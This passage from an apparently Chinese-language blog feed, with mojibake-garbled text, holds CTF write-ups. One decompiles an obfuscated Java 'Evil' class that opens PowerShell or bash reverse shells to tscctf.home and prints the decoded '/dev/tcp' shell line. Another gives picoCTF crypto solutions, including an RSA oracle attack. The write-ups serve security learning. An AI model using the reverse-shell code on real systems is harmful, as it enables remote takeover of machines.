href="#è£œé¡Œå€" class="headerlink"></a></h2><h3 id="misc---a-minecraft-soc-mission">Misc - A Minecraft SOC Mission<a href="#misc---a-minecraft-soc-mission" class="headerlink"></a></h3><p>é€™é¡Œå…¶å¯¦è³½ä¸­å°±æœ‰åšå‡ºä¾†äº†ï¼Œä½† flag æ ¼å¼æéŒ¯äº† å•Šå•Šå•Šå•Šå•Šï¼Œèˆ‡ 388åˆ†å¤±ä¹‹äº¤è‡‚</p><p>æŠŠä¸‹è¼‰çš„ <code>Evil.class</code> æ‹¿å»åç·¨è­¯ (å¯ä»¥ç”¨<a href="https://decompiler.com/">é€™å€‹</a>)ï¼Œå°±æœƒå¾—åˆ°</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> {</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] $ = <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"QTlXNHY2eXVpPQ=="</span>, <span class="string">"WVcxdmJtY3NJR0Z1WkNCemJ5QnBjeUJwZENCbGVHVmpkWFJwYm1jPQ=="</span>, <span class="string">"ZEhOalpYUm1MbWh2YldVPQ=="</span>};</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> String á…Ÿ = <span class="string">"k9"</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> ã…¤ = <span class="number">1017</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> á… (<span class="type">byte</span>[] var1) {</span><br><span class="line">      <span class="keyword">try</span> {</span><br><span class="line">         String[] var2 = (<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode($[<span class="number">1</span>]))).split(<span class="string">","</span>);</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getDecoder().decode($[<span class="number">2</span>]));</span><br><span class="line">         <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> (String)Class.forName(<span class="string">"java.lang.System"</span>).getMethod(<span class="string">"getProperty"</span>, String.class).invoke((Object)<span class="literal">null</span>, var2[<span class="number">0</span>]);</span><br><span class="line">         <span class="type">boolean</span> <span class="variable">var5</span> <span class="operator">=</span> var4.toLowerCase().contains(var2[<span class="number">1</span>]);</span><br><span class="line">         String[] var10000;</span><br><span class="line">         <span class="keyword">if</span> (var5) {</span><br><span class="line">            var10000 = <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="literal">null</span>};</span><br><span class="line">            <span class="type">String</span> <span class="variable">var10003</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]{<span class="number">112</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">101</span>, <span class="number">32</span>});</span><br><span class="line">            var10000[<span class="number">2</span>] = var10003 + <span class="string">"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdABzAGMAYwB0AGYALgBoAG8AbQBlACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</span>;</span><br><span class="line">         } <span class="keyword">else</span> {</span><br><span class="line">            var10000 = <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="built_in">this</span>.ã…¤ã…¤(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"echo"</span>, <span class="string">"YmFzaCAtaSA+JiAvZGV2L3RjcC90c2NjdGYuaG9tZS80NDMgMD4mMQ=="</span>, <span class="string">"base64"</span>, <span class="string">"-d"</span>, <span class="string">"bash"</span>})};</span><br><span class="line">         }</span><br><span class="line"></span><br><span class="line">         String[] var6 = var10000;</span><br><span class="line">         Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>, String[].class).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke((Object)<span class="literal">null</span>), var6);</span><br><span class="line">      } <span class="keyword">catch</span> (Exception var7) {</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> String ã…¤ã…¤(String[] var1) {</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var1.length; ++var3) {</span><br><span class="line">         var2.append(var1[var3]);</span><br><span class="line">         <span class="keyword">if</span> (var3 &lt; var1.length - <span class="number">1</span>) {</span><br><span class="line">            var2.append(<span class="string">" | "</span>);</span><br><span class="line">         }</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> var2.toString();</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> {</span><br><span class="line">      (<span class="keyword">new</span> <span class="title class_">Evil</span>()).á… (<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>]);</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>æŠŠä¸€äº›çœ‹èµ·ä¾†åƒ base64 éçš„æ±è¥¿è§£å¯†å¾Œå°±çŸ¥é“ä»–æ˜¯ä¸€å€‹åŸ·è¡Œ reverse shellçš„ç¨‹å¼<code>bash -i &gt;&amp; /dev/tcp/tscctf.home/443 0&gt;&amp;1</code>ï¼Œç„¶å¾Œè¦äº¤çš„æ±è¥¿å°±æ˜¯ <code>tscctf.home</code> äº†ï¼ŒåŸæœ¬é‚„åœ¨æƒ³è¦æ€éº¼æ‰¾åˆ°ip é‚„ç”¨ <code>tscctf{}</code> åŒ…èµ·ä¾†ï¼Œæ²’æƒ³åˆ°é€™éº¼ç°¡å–®å—šå—š</p><p>flag: <code>tscctf.home</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åœ¨ Qualified Scoreboard ç¬¬äº”ï¼Œå…¨éƒ¨äººçš„ç¬¬ 41ï¼Œå—šå—šè¢«è™çˆ›äº†&lt;/p&gt;
&lt;figure&gt;
&lt;img data-src=&quot;https://i.imgur.com/IGyLku7.png&quot; alt=&quot;Qualified Scoreboard&quot;&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;Qualified Scoreboard&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;figure&gt;
&lt;img data-src=&quot;https://i.imgur.com/bImlzwR.png&quot; alt=&quot;Overall Scoreboard&quot;&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;Overall Scoreboard&lt;/figcaption&gt;
&lt;/figure&gt;</summary>
    
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="TSCCTF" scheme="https://moon-jam.me/tags/TSCCTF/"/>
    
    <category term="Writeup" scheme="https://moon-jam.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day30</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day30/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day30/</id>
    <published>2024-10-02T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>ä¸‰åå¤©äº†ï¼ ä»Šå¤©å°±å¯«å…­é¡Œ Crypto çš„ Writeup ï¼Œæœ€å¾Œå†ä¾†å€‹å°å°ç¸½çµ</p><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="ç¬¬ä¸€é¡Œrsa_oracle">ç¬¬ä¸€é¡Œï¼šrsa_oracle <a href="#ç¬¬ä¸€é¡Œrsa_oracle" class="headerlink"></a></h3><p>é€™é¡Œè¦åˆ©ç”¨ RSA æ¨¡é‹ç®—ä¸­ä¹˜çš„æ€§è³ªè§£å‡ºé€™é¡Œ</p><p><span class="math display">\[c = m^e \mod n\]</span><br><span class="math display">\[m = c^d \mod n\]</span><br><span class="math display">\[(a \cdot b) \mod n = ((a \mod n) \cdot (b\mod n)) \mod n\]</span><br><span class="math display">\[m_1*m_2 = (c_1^d \mod n) \cdot (c_2^d \modn) = (c_1^d \cdot c_2^d) \mod n = (c_1 \cdot c_2)^d \mod n\]</span></p><p>æˆ‘å€‘å¯å°‡ <span class="math inline">\(c_1\)</span>è¨­ç‚ºé¡Œç›®çµ¦çš„å¯†ç¢¼ï¼Œ<span class="math inline">\(c_2\)</span>è‡ªå·±è¨­ä¸€å€‹æ•¸å­—ï¼Œå°±èƒ½è—‰ç”± <span class="math inline">\(c_2\)</span> å’Œ<span class="math inline">\(c_1*c_2\)</span> çš„è§£å¯†çµæœï¼Œæ¨å‡º <span class="math inline">\(c_1\)</span>çš„æ˜æ–‡ï¼Œä¹Ÿå°±æ˜¯ç”¨ä¾†è§£å¯†ç”¨çš„å¯†ç¢¼ï¼Œå†æ ¹æ“šæç¤ºåˆ©ç”¨ openssl è§£å‡º flagã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: io = remote(<span class="string">"titan.picoctf.net"</span>, <span class="number">59764</span>)</span><br><span class="line">[x] Opening connection to titan.picoctf.net on port <span class="number">59764</span></span><br><span class="line">[x] Opening connection to titan.picoctf.net on port <span class="number">59764</span>: Trying <span class="number">3.139</span><span class="number">.174</span><span class="number">.234</span></span><br><span class="line">[+] Opening connection to titan.picoctf.net on port <span class="number">59764</span>: Done</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: io.sendline(<span class="string">b"E"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: io.sendline(<span class="string">b"\x02"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: io.recv()</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">b'*****************************************\n****************THE ORACLE***************\n*****************************************\nwhat should we do for you? \nE --&gt; encrypt D --&gt; decrypt. \nenter text to encrypt (encoded length must be less than keysize): \x02\n\nencoded cleartext as Hex m: 2\n\nciphertext (m ^ e mod n) 5067313465613043651275429665315895824157755779222372979446076012356324498190828210335763979330272318657269048435311897896433721115606764442199497891219230\n\nwhat should we do for you? \nE --&gt; encrypt D --&gt; decrypt. \n'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: c2 = <span class="number">5067313465613043651275429665315895824157755779222372979446076012356324498190828210335763979330272318657</span></span><br><span class="line">   ...: <span class="number">269048435311897896433721115606764442199497891219230</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: c = <span class="number">17650370497640477243481146344736587348304908520660613456869163656586181949810972167509294217348129116804</span></span><br><span class="line">   ...: <span class="number">34647401939068526285652985802740837961814227312100</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: io.sendline(<span class="string">b"D"</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: io.sendline(<span class="built_in">str</span>(c2*c).encode())</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: io.recv()</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">b'Enter text to decrypt: decrypted ciphertext as hex (c ^ d mod n): 707062c872\ndecrypted ciphertext: ppb\xc3\x88r\n\nwhat should we do for you? \nE --&gt; encrypt D --&gt; decrypt. \n'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: password = <span class="built_in">int</span>(<span class="string">"707062c872"</span>, <span class="number">16</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: long_to_bytes(password).decode()</span><br><span class="line">Out[<span class="number">13</span>]: <span class="string">'881d9'</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl enc -aes-256-cbc -d -<span class="keyword">in</span> secret.enc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter AES-256-CBC decryption password:</span><br><span class="line">*** WARNING : deprecated key derivation used.</span><br><span class="line">Using -iter or -pbkdf2 would be better.</span><br><span class="line">picoCTF{su......b6}</span><br></pre></td></tr></tbody></table></figure><h3 id="ç¬¬äºŒé¡Œcustom-encryption">ç¬¬äºŒé¡Œï¼šCustom encryption <a href="#ç¬¬äºŒé¡Œcustom-encryption" class="headerlink"></a></h3><p>æŒ‰ç…§é¡Œç›®çµ¦çš„ script ä¸€æ­¥æ­¥å€’æ¨å›å»å°±å¯ä»¥å¾—åˆ°ç­”æ¡ˆäº†</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">a = <span class="number">95</span></span><br><span class="line">b = <span class="number">21</span></span><br><span class="line">sharded_key = gcd(<span class="number">237915</span>, <span class="number">1850450</span>, <span class="number">1850450</span>, <span class="number">158610</span>, <span class="number">2458455</span>, <span class="number">2273410</span>, <span class="number">1744710</span>, <span class="number">1744710</span>, <span class="number">1797580</span>, <span class="number">1110270</span>, <span class="number">0</span>, <span class="number">2194105</span>, <span class="number">555135</span>, <span class="number">132175</span>, <span class="number">1797580</span>, <span class="number">0</span>, <span class="number">581570</span>, <span class="number">2273410</span>, <span class="number">26435</span>, <span class="number">1638970</span>, <span class="number">634440</span>, <span class="number">713745</span>, <span class="number">158610</span>, <span class="number">158610</span>, <span class="number">449395</span>, <span class="number">158610</span>, <span class="number">687310</span>, <span class="number">1348185</span>, <span class="number">845920</span>, <span class="number">1295315</span>, <span class="number">687310</span>, <span class="number">185045</span>, <span class="number">317220</span>, <span class="number">449395</span>) // <span class="number">311</span></span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">237915</span>, <span class="number">1850450</span>, <span class="number">1850450</span>, <span class="number">158610</span>, <span class="number">2458455</span>, <span class="number">2273410</span>, <span class="number">1744710</span>, <span class="number">1744710</span>, <span class="number">1797580</span>, <span class="number">1110270</span>, <span class="number">0</span>, <span class="number">2194105</span>, <span class="number">555135</span>, <span class="number">132175</span>, <span class="number">1797580</span>, <span class="number">0</span>, <span class="number">581570</span>, <span class="number">2273410</span>, <span class="number">26435</span>, <span class="number">1638970</span>, <span class="number">634440</span>, <span class="number">713745</span>, <span class="number">158610</span>, <span class="number">158610</span>, <span class="number">449395</span>, <span class="number">158610</span>, <span class="number">687310</span>, <span class="number">1348185</span>, <span class="number">845920</span>, <span class="number">1295315</span>, <span class="number">687310</span>, <span class="number">185045</span>, <span class="number">317220</span>, <span class="number">449395</span>]</span><br><span class="line"></span><br><span class="line">semi_cipher = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">    semi_cipher += (<span class="built_in">chr</span>(char//sharded_key//<span class="number">311</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_xor_decrypt</span>(<span class="params">cipher_text, text_key</span>):</span><br><span class="line">    rev_ans = <span class="string">""</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(text_key)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line">        key_char = text_key[i % key_length]</span><br><span class="line">        encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))</span><br><span class="line">        rev_ans += encrypted_char</span><br><span class="line">    <span class="keyword">return</span> rev_ans[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">plain_text = dynamic_xor_decrypt(semi_cipher, <span class="string">"trudeau"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br></pre></td></tr></tbody></table></figure><h3 id="ç¬¬ä¸‰é¡Œc3">ç¬¬ä¸‰é¡Œï¼šC3 <a href="#ç¬¬ä¸‰é¡Œc3" class="headerlink"></a></h3><p>ä¸€æ¨£æŒ‰ç…§ç·¨ç¢¼å™¨æ§‹é€ å‡ºè§£ç¢¼å™¨</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lookup1 = <span class="string">"\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">lookup2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">"DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl"</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">    cur = (lookup2.index(char) + prev) % <span class="number">40</span></span><br><span class="line">    ans += lookup1[cur]</span><br><span class="line">    prev = cur</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></tbody></table></figure><p>ç¥å¥‡åœ°å¾—åˆ°äº†ä¸€ä¸²æ–°çš„ python 2 ç¨‹å¼ç¢¼</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#asciiorder</span></span><br><span class="line"><span class="comment">#fortychars</span></span><br><span class="line"><span class="comment">#selfinput</span></span><br><span class="line"><span class="comment">#pythontwo</span></span><br><span class="line"></span><br><span class="line">chars = <span class="string">""</span></span><br><span class="line"><span class="keyword">from</span> fileinput <span class="keyword">import</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">input</span>():</span><br><span class="line">    chars += line</span><br><span class="line">b = <span class="number">1</span> / <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">    <span class="keyword">if</span> i == b * b * b:</span><br><span class="line">        <span class="built_in">print</span> chars[i] <span class="comment">#prints</span></span><br><span class="line">        b += <span class="number">1</span> / <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>æŠŠä¿®æ”¹æˆ python3 çš„ç¨‹å¼ç¢¼ç„¶å¾Œå†æŠŠé€™ä¸²ç¨‹å¼ç¢¼ç•¶æˆè¼¸å…¥å°±å¾—åˆ° flag äº†</p><p><code>picoctf{a....s}</code></p><h3 id="ç¬¬å››é¡Œrotation">ç¬¬å››é¡Œï¼šrotation <a href="#ç¬¬å››é¡Œrotation" class="headerlink"></a></h3><p>æ ¹æ“šé¡Œç›®çµ¦çš„å¯†æ–‡éš¨ä¾¿ rotate ä¸€ä¸‹å°±å¾—åˆ°ç­”æ¡ˆäº†</p><figure><img data-src="https://i.imgur.com/2PdDAFF.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äº”é¡Œreadmycert">ç¬¬äº”é¡Œï¼šReadMyCert <a href="#ç¬¬äº”é¡Œreadmycert" class="headerlink"></a></h3><p>æŸ¥äº†ä¸€ä¸‹è§£æ cert çš„æŒ‡ä»¤ï¼Œç„¶å¾Œå°±å¾—åˆ° flag äº†</p><figure><img data-src="https://i.imgur.com/nabNssw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬å…­é¡Œhidetosee">ç¬¬å…­é¡Œï¼šHideToSee <a href="#ç¬¬å…­é¡Œhidetosee" class="headerlink"></a></h3><p>æŸ¥äº†ä¸€ä¸‹éš±å¯«è¡“çš„å·¥å…·ï¼Œæƒ³ç”¨ç”¨ Steghide ä½† macä¸€æ™‚è£ä¸èµ·ä¾†å°±éš¨ä¾¿æ‰¾äº†ä¸€å€‹ <a href="https://futureboy.us/stegano/decinput.html">online tool</a>è§£å‡ºäº†ä¸€ä¸²çœ‹èµ·ä¾†ä¸€å‰¯å¿«æ˜¯ flag çš„æ±è¥¿</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">krxlXGU{zgyzhs_xizxp_05y2z65z}</span><br></pre></td></tr></tbody></table></figure><p>ç„¶å¾Œå†ç”¨åœ–ç‰‡ä¸­è¬›åˆ°çš„ Atbash Cipher è§£å¯†çœ‹çœ‹ï¼Œå°±æˆåŠŸå¾—åˆ° flag äº†</p><figure><img data-src="https://i.imgur.com/wp3kUxt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="ç¸½çµ">ç¸½çµ <a href="#ç¸½çµ" class="headerlink"></a></h2><p>æœ€å¾Œä¸€å¤©äº†ï¼Œéµäººè³½é€™æ®µæ™‚é–“æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é€™æ¨£é•·æ™‚é–“æ¥è§¸é€™äº›è³‡å®‰æŠ€è¡“ã€åˆ·CTF é¡Œç›®ï¼Œä¾†çœ‹ä¸€ä¸‹æœ€å¾Œçš„æˆæœ</p><ul><li>æ¯å¤©å…­é¡Œ picoCTF<ul><li>é”æˆï¼š 103 / 174 é¡Œ</li></ul></li><li>æ¯ä¸‰å¤©ä¸€éƒ¨ Beef Soup çš„æ•™å­¸å½±ç‰‡<ul><li>é”æˆï¼š 6 / 9 éƒ¨</li></ul></li></ul><p>æˆ‘çš„é”æˆç‡å¤§æ¦‚åªæœ‰ 6 æˆwwï¼Œä¸éå­¸åˆ°çš„æŠ€è¡“é‚„æ˜¯æŒºå¤šçš„ï¼ŒçŸ¥é“å„ç¨®å¸¸è¦‹çš„é¡Œå‹ï¼Œå› ç‚ºè·Ÿè‘—èª²ç¨‹å­¸ï¼Œä¸»è¦é‚„æ˜¯åœ¨ç©Web ï¼Œåƒæ˜¯ path traversal, lfi, sql injection, â€¦ ä¸€å¤§å †å¯ä»¥ç©çš„æ´ï¼Œè€ŒCrypto, pwn, reverse éƒ½é‚„æ²’æœ‰å¤ªå¤šç ”ç©¶ï¼Œç›®å‰æ„Ÿè¦º web çš„é€™äº› CTFé¡Œç›®å¾ˆå¥½ç©ï¼Œé›–ç„¶çŸ¥é“é¡Œç›®éƒ½æ˜¯è¨­è¨ˆéçš„ï¼Œä½†æ¯æ¬¡æŠŠä¸€å€‹çœ‹ä¼¼ä¸€åˆ‡æ­£å¸¸çš„ç¶²ç«™æ‰“å‡ºä¸€å€‹æ´å°±å¾ˆæœ‰æˆå°±æ„Ÿï¼Œä¹‹å¾Œæ‡‰è©²æœƒæ…¢æ…¢é»é–‹è‡ªå·±çš„æŠ€èƒ½æ¨¹ï¼Œå»åƒåŠ 